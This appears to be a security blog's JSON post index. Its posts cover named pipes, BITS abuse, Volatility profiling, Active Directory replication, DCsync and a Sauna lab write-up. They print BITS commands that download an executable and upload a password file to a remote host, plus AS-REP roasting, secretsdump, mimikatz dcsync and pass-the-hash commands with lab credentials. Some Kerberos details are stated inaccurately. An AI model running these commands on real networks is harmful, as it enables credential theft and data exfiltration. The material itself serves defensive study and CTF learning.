[
  
  {
    "title": "Named Pipe",
    "url": "/posts/NamedPipe/",
    "categories": "Blue Team, Windows Service, Named Pipe",
    "tags": "Replication, KCC, AD",
    "date": "2025-10-16 11:00:00 -0400",
    "content": "Named Pipe  Basically, a named pipe is an Inter-Process Communication (IPC) mechanism.  IPC (Inter-Process Communication) allows processes to exchange data using two main methods: shared memory and message passing.  In shared memory, the operating system provides a memory region that both processes can access — one writes the data while the other reads it but proper synchronization is required.  In message passing, instead of sharing the same memory, Process A sends a message to the OS, and the OS delivers it to Process B. Mechanisms such as pipes and sockets are used for this.  A named pipe implements message passing using a client–server model, where the client sends requests and the server responds — simple and efficient yeah !!  Many applications can act as both clients and servers, especially in distributed computing environments.  Named pipes support two main communication modes:     One-way communication (half-duplex)   Two-way communication (full-duplex)   These modes define how data flows between the pipe server and one or more pipe clients.  For example, when we run a normal process from PowerShell — e.g., Procmon from Sysinternals, it may create a named pipe to interact with its system driver. In this scenario, PowerShell is just the parent process; the named pipe is created between the user-mode process (Procmon) and its kernel-mode driver. When a process like this runs, Windows may record an event in the Event Viewer showing that PowerShell started an IPC listening thread — indicating the process was launched from PowerShell and a named pipe was established for communication.    How It Works  As mentioned, named pipes use the IPC message-passing mechanism, allowing Process A to send data to Process B through the operating system.  When a pipe is created, it must have a specific static name or path that both the client and the server use to connect.  If a named pipe is created locally, the name looks like:  \\\\.\\pipe\\Yazan If the named pipe is created on another machine, it looks like: \\\\192.168.x.x\\pipe\\Yazan Named pipes are managed by the NPFS.sys driver, located at:  C:\\Windows\\System32\\drivers\\npfs.sys   This driver maintains a list of common named pipes used by the operating system and various applications.  The image below shows identical pipe names on two different machines — these represent default system pipes. Other pipe names may belong to specific applications or built-in utilities that come preinstalled with the system.  Inside the kernel, the pipe exists as an object under the path:  \\Device\\NamedPipe\\&lt;PipeName&gt;  This is the technical name used by the kernel and low-level tools. Tools like WinObj can reveal the actual Windows object namespace.    Attackers and APTs may exploit named pipes to achieve lateral movement without detection  some attacks exploits an built-in named pipes such as one of the most common named pipe  TSVCPIPE related to remote desktop in CVE 2023-2313  while other attacks create named pipes with random tokens or GUIDs. Once a malicious pipe is created, it can be used in different ways, for example     The client sends data to the server.   The server receives data from other machines.   Two processes connect to exchange data.   When a pipe is created, you should analyze it using Sysmon Event ID 17, check which networking connections were established after that event, and identify the process related to the named pipe.  But the question remains: can we actually know what data is being transferred through the pipe?  see the demo/video below for a practical example.    ACLs, Security, and Impersonation     ACL / Permissions:            When creating a Named Pipe, you can pass SECURITY_ATTRIBUTES or a Security Descriptor to define who can connect, read, or write to it. If the ACL is left too permissive, any local process might be able to connect — which is a serious security risk.       It’s important to set a proper DACL (Discretionary Access Control List) on sensitive pipes — for example, allowing access only to a specific service group or a designated service account.            "
  },
  
  {
    "title": "BITS Windows",
    "url": "/posts/BITS/",
    "categories": "Blue Team, Windows Service, Background Intelligent Transfer Service",
    "tags": "BITS, LOTL, Windows Service, DFIR",
    "date": "2025-10-07 14:45:00 -0400",
    "content": "The Quiet Windows Service That Became a Cyber Weapon  In the heart of Windows lives a small, polite service called BITS — Background Intelligent Transfer Service. It was designed to quietly move files (updates, assets) in the background and resume transfers after reboots or network outages. But what makes a helpful system feature so interesting to defenders — and attractive to attackers — is exactly what makes it invisible: it’s trusted, it runs as a Windows service, and it behaves politely on the network.  What is BITS ?  The “Background Intelligent Transfer Service” (BITS) is a technology developed by Microsoft in order to manage file uploads and downloads, to and from HTTP servers and SMB shares, in a more controlled and load balanced way. If the user starting the download were to log out the computer, or if a network connection is lost, BITS will resume the download automatically; the capability to survive reboots makes it an ideal tool for attackers to drop malicious files into an impacted Windows workstation, especially considering that Microsoft boxes do not have tools like “wget” or “curl” installed by default, and that web browsers (especially those in Corporate environments) may have filters and plugins preventing the download of bad files.    From maintenance tool to attacker toolkit  BITS was built to be resilient and unobtrusive. Attackers realized they could live off the land — using built-in, legitimate tools to bypass defenses — by letting BITS download or upload malicious files. Because BITS runs under svchost.exe and uses standard Windows mechanisms, it often slips past firewalls and detection rules that focus on non-native tools.  How to Use it ?  to Download file  bitsadmin /transfer ALPHA /download /priority high http://www.abcef.it/file.exe c:\\test1.jpg   if files are downloaded via BITS, the “Content-Type” value in the log will vary, according to the content type of the downloaded resource.  The transfer of     a binary file will have an “Application Octet-Stream” value for binary file transfers   a text file, or Javascript code, will have a “text/html” content type   this can be helpful while monitoring on SIEM, but unforentialty we can’t see the content if the company doesn’t apply  SSL/TLS interception.  to Add file  Bitsadmin /addfile ALPHA http://downloadsrv/file2.exe c:\\test2.jpg   to Upload file  Start-BitsTransfer –TransferType Upload –Source “C:\\Temp\\pass.txt” –Destination http://192.168.11.22/pass.txt   once it ran to transfer files there is a sequences of event id generated in the event log under the path   Microsoft_Windows_Bits_Client_Operational.evtx such as     Event ID 3: information about the job creation   Event ID 59: information about the start of the service: “BytesTransferred” value is zero;   Event ID 60: status of the job   Event ID 4: completion of the job. “BytesTransferred” value is the size of the downloaded file. This sequence of event IDs (3, 59, 60 and 4) will be the same even in the case of a file upload   In the case that the transfer is interrupted during the download, an Event ID 61 (instead of Event ID 60) will be recorded   How can i monitor my transferring ?  In order to check the BITS jobs that are still to be completed, the command lines “Bitsadmin /monitor” or the Powershell “Get-BitsTransfer | select* can be used  i can find more on Hard Disk     the so-called “Queue Manager artefacts”, also called “State Files”. These files are named “qmgr0.dat” and “qmgr1.dat” and are located at path “C:\\ProgramData\\Microsoft\\Network\\Downloader”   Special thanks for SANS "
  },
  
  {
    "title": "Volatiltiy - imageinfo Plugin",
    "url": "/posts/VolatilityImageInfo/",
    "categories": "Blue Team, Volatility",
    "tags": "Volatiltiy2, Volatiltiy3, imageinfo, DFIR",
    "date": "2025-10-02 17:12:00 -0400",
    "content": "Instead of struggling for hours with the plugin imageinfoto identify the image profile, especially when dealing with images exceeding 50GB that take 2+ hours, we can utilize Volatility3 plugins and leverage their output for Volatility2, yeah !!  Essentially, Windows stores comprehensive information in registry hives. In this article, we’ll focus on the Software hive, particularly on the current build number and other relevant information.  Volatility3 can extract Software hive information using only the “windows.registry” Plugin, bypassing the need for the imageinfo plugin. Thus, we can take advantage of this plugin to read the registry hive.  This method isn’t common, so if I see you using it, I’m pretty sure you’ve read this article! xD  The following example involves an image from a CTF, but this method can be applied to any memory image you desire! I’ve been using this approach for two years now, and it has never let me down.     we need to  read all the information stored in the current version of the Software hive, specifically related to the system’s general information, by using the following command in volatility 3:   vol3 -f memdump.mem windows.registry.printkey.PrintKey — key “Microsoft\\Windows NT\\CurrentVersion”        After running the command, what we need to focus on are:            ProductName: Windows 10 Pro                CurrentBuildNumber: 19043                            now we need to use volatiltiy 2 to get the excat or closest profile for the memory by using this command:   vol.py -info | grep Win10     Our Profile number on volatiltiy 3 is 19043 , from this step we can chose the same number if we can’t find the same number we can choose the closest one to the current number, in our case 19041       Note(1): Sometimes you may obtain the exact number depending on the Windows version, while other times you might receive a number higher than yours. It’s generally better to select a number that is equal to or higher than yours.       Note(2): For Windows service pack numbers, you can obtain them using the same method. The more accurate the number, the faster and error-free the output you’ll receive.   "
  },
  
  {
    "title": "DCsync Attack",
    "url": "/posts/DCsyncAttack/",
    "categories": "Active Directory - CRTP, DCsync, DCsync Attack",
    "tags": "Replication, secretdump, ntds, ChangeAll",
    "date": "2025-09-29 11:00:00 -0400",
    "content": "DCsync  abuses Active Directory replication: an attacker impersonates a domain controller and requests replication from a real DC to obtain credential material (password hashes, Kerberos keys, etc.). This lets the attacker harvest account credentials without directly compromising the domain controller’s NTDS.dit file.  How it works (short):       AD replication allows DCs to exchange directory changes.   If an account has the appropriate replication privileges, an actor can request those changes and receive sensitive secrets (NT hashes, AES keys) for domain accounts.   This is not possible for arbitrary domain users — specific permissions are required.   Required permissions / privileges  (typically granted to high-privilege groups such as Domain Admins / Enterprise Admins / Domain Controllers, or explicitly delegated):     DS-Replication-Get-Changes   DS-Replication-Get-Changes-All   DS-Replication-Get-Changes-In-Filtered-Set     Typical workflow / examples     Attacker impersonates a domain controller and requests replication from a real DC.   Use tools to request/collect secrets from the target DC.   Example tools / commands (formatted):  # Using Impacket's secretsdump (example placeholder) # format may vary; adapt to your toolset/environment secretsdump.py svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175  # Mimikatz (run on a compromised machine with appropriate privileges) # in mimikatz interactive shell: lsadump::dcsync /user:DOMAIN\\Geno  # Use harvested hashes with psexec (Impacket) to authenticate over SMB psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' \\   -dc-ip 10.10.10.175 administrator@10.10.10.175  # Another example tool invocation (nxc.exe example from your notes) nxc.exe smb geno.gove.local -u mikasa -p 'P@ssw0rd' --ntds   "
  },
  
  {
    "title": "Sauna Writeup",
    "url": "/posts/Sauna-HTB-Machine/",
    "categories": "Active Directory - CRTP, DCsync",
    "tags": "Replication, DCsync, AS-REP Roasting, AD, WinRM, WinPEAS",
    "date": "2025-09-28 11:00:00 -0400",
    "content": "❗Important Commands in this article ❗  1. GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users_ready -dc-ip 10.10.10.175 -no-pass 2. upload /opt/pref/winPEAS.ps1 C:\\\\Users\\\\FSmith\\\\Documents\\\\winPEAS.ps1 3. Get-ObjectAcl | Select ObjectSID,ActiveDirectoryRights | Format-List 4. secretsdump.py svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175 5. [secretsdump.py](http://secretsdump.py/) svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175   Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation, these two attacks we can take a benefit from them when we do a Security assessment to the companies and entities, you will find some of users have wrong permission that leads to these attacks.  with this article am going to correlate everything with realistic scenarios that i personally faced in my technical assessment tasks at my work.  after the initial enumeration of the machine , I found it is a DC and many of interesting ports that opened to the public such as port 88  for this port (88) -  this is responsible for Kerberos authentication,  while this port is responsible for Kerberos authentication its a good point to exploit it by finding if there is a user have permission “Do not require Kerberos pre-authentication”.  why we are looking for this permission ?  because in the first step of the authentication with Kerberos the user sends a message requests     AS-REQ asking for verifying username and password from the KDC in the domain controller in order to granting a ticket, the DC will check the user and  password and then it will send AS-RES, if the permission “Do not require Kerberos pre-authentication”  enabled on the user that requested the ticket, **That means the KDC will send the AS-REP (TGT) directly to the user without verifying the password first. This AS-REP contains both the user’s NTLM hash and the TGT encrypted by the KRBTGT account.  In this attack, we focus on extracting the NTLM hash part to crack the user’s password.      Then i need the users list for Active directory, the good point in the Active directroy that All administrator have the same concept about creating users in the active directory, the conecpt is, don’t add the full username to login the user name have to be first letter of his username and then family name, or user name and first or and second  letter of the family name.  for example  my name is yazan saleh  it can be Y.saleh or Yazan.sh  we can use tool such as username-anarchy  to create our own list, for the Sauna’s machine i got all the usernames from web page they posted the team member, so  generate a list for each name    now we need to start our hypothisi for the vulnarability on kerberos port, we have our list ready, and we have ip of the machine  we can use [NPGetusers.py] NPGetusers.py from impact scripts, if you didn’t find it online you can install impacet using pip  GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users_ready -dc-ip 10.10.10.175 -no-pass     cracking the user by finding the module on hashcat table that start with $krb4asrep$23$    now we can connect on the machine using evil-winrm port 5985  by using evil-winrm plugins we can upload our winpeas to Check the Local Windows Privilege Escalation    to upload files using evil-winrm you have to head to the directory that contains the files you need to uplaod to the victem machine, then lunch your connection from their as shows in the figure below:    then use upload plugin to upload it their.  upload /opt/pref/winPEAS.ps1 C:\\\\Users\\\\FSmith\\\\Documents\\\\winPEAS.ps1   After running the script i found the svc_loanmanager services with password that added on auto login, and this services is part of admin group.    then i enumerated the ACL for the following users  using power view and AD module    by command  Get-ObjectAcl | Select ObjectSID,ActiveDirectoryRights | Format-List     DCsync abuses Active Directory replication: an attacker impersonates a domain controller and requests replication from a real DC to obtain credential material (password hashes, Kerberos keys, etc.). This lets the attacker harvest account credentials without directly compromising the domain controller’s NTDS.dit file.  How it works (short):       AD replication allows DCs to exchange directory changes.   If an account has the appropriate replication privileges, an actor can request those changes and receive sensitive secrets (NT hashes, AES keys) for domain accounts.   This is not possible for arbitrary domain users — specific permissions are required.   Required permissions / privileges  (typically granted to high-privilege groups such as Domain Admins / Enterprise Admins / Domain Controllers, or explicitly delegated):     DS-Replication-Get-Changes   DS-Replication-Get-Changes-All   DS-Replication-Get-Changes-In-Filtered-Set     and found  permission DS-Replication-Get-Changes on the user SVC_Loanmgt  we can lunch our attack to get a copy of the ntds.dit file    "
  },
  
  {
    "title": "What is Replication",
    "url": "/posts/Replication/",
    "categories": "Active Directory - CRTP, DCsync, Replication",
    "tags": "Replication, KCC, AD",
    "date": "2025-09-28 11:00:00 -0400",
    "content": "DCsync  we need to understand Replication in order to perform DCsync Attack.  What is Replication in Active Directory?  Replication is the process used between Domain Controllers (DCs) in an Active Directory environment to ensure they all have the same up-to-date database.  Every Domain Controller stores a copy of the Active Directory database.     If one DC fails, others can still provide authentication and authorization services.   This is why large organizations need multiple DCs that constantly replicate data.   Example:  If an administrator adds a new user on DC1, the same information must be replicated to DC2 and DC3.  That way, if DC1 goes down, the user can still log in through DC2 because their credentials exist there as well.  so  any single change has been done on one of the DC will be replicated on the other DCs  The Active Directory database is stored in the file:  C:\\Windows\\ntds.dit   Any change in AD is written to this file, and then replicated across other DCs.    How Replication Works     When a change happens on DC1, a notification is generated by the KCC (Knowledge Consistency Checker).        Other DCs see this notification and pull the update from DC1.             Important: Updates are pulled by DCs, not pushed automatically.            Replication can be scheduled (e.g., twice a day, before and after working hours) to reduce bandwidth impact.  By default, the KCC refreshes every 15 minutes, or it can be triggered manually with:  repadmin /kcc     Active Directory Partitions  The ntds.dit file contains four partitions:     Domain Partition – Stores objects, containers, and domain information.   Configuration Partition – Stores sites, services, and AD configuration.            Same site: replication happens every 7–15 seconds.       Different sites: every 180 minutes.           Schema Partition – Defines object classes and attributes.   Application Partition – Used for DNS replication:            To all DNS servers in the forest.       To all DNS servers in the domain.             Types of Replication     Intra-site – Between DCs within the same site.   Inter-site – Between DCs across different sites.     Single Master vs Multi-Master          Single Master:      If there’s only one DC in the domain, no replication occurs (no second DC to sync with).           Multi-Master:      If multiple DCs exist and all are writable, replication occurs across all of them.        Tricks and Notes     If a user is moved to an OU and that OU is deleted on another DC, the user object ends up in the LostAndFound container.   Replication conflicts and versioning:            Every object has:                    Version Number – the edit version.           Timestamp – time of the change.           DC GUID – the identifier of the DC that made the change.                       The newest update (version + timestamp) wins and replicates to other DCs.                Indirect Replication:      Example with DC1, DC2, DC3:             DC1 and DC3 are not directly connected.       DC2 is connected to both.       Updates flow from DC1 → DC2 → DC3.           "
  }
  
]

